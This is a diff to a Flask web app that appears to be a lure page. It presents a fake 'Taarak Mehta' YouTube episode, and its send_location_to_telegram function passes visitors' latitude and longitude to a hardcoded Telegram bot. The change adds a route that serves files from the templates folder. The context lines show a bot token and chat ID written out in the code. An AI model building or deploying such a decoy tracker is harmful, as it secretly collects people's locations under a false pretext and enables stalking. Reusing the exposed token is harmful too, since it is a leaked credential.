@@ -1,4 +1,4 @@
-from flask import Flask, render_template, request, jsonify, redirect
+from flask import Flask, render_template, request, jsonify, redirect, send_from_directory
 import requests
 import base64
 from io import BytesIO
@@ -9,13 +9,17 @@ app = Flask(__name__)
 TELEGRAM_BOT_TOKEN = '8280216938:AAEwCN0U8HkhNqikde5Nq3ODTgpaZlNQZhQ'
 TELEGRAM_CHAT_ID = '7343057223'
 
-# In-memory configuration (since Render filesystem isn't persistent)
+# In-memory configuration
 current_config = {
     "youtube_url": "https://youtu.be/pWPSWwK7w8w?si=BVRHs_Kc_STKulz4",
     "video_title": "Taarak Mehta Ka Ooltah Chashmah - Latest Episode",
     "video_description": "Comedy Show - New Episode",
     "video_thumbnail": "https://i.ytimg.com/vi/pWPSWwK7w8w/maxresdefault.jpg"
 }
+
+@app.route('/static/<filename>')
+def static_files(filename):
+    return send_from_directory('templates', filename)
 
 def send_location_to_telegram(lat, lon):
     location_url = f"https://www.google.com/maps?q={lat},{lon}"
@@ -55,7 +59,6 @@ def update_video():
     global current_config
     data = request.json or {}
     
-    # Update the global config
     current_config.update({
         "youtube_url": data.get('youtube_url', current_config['youtube_url']),
         "video_title": data.get('video_title', current_config['video_title']),
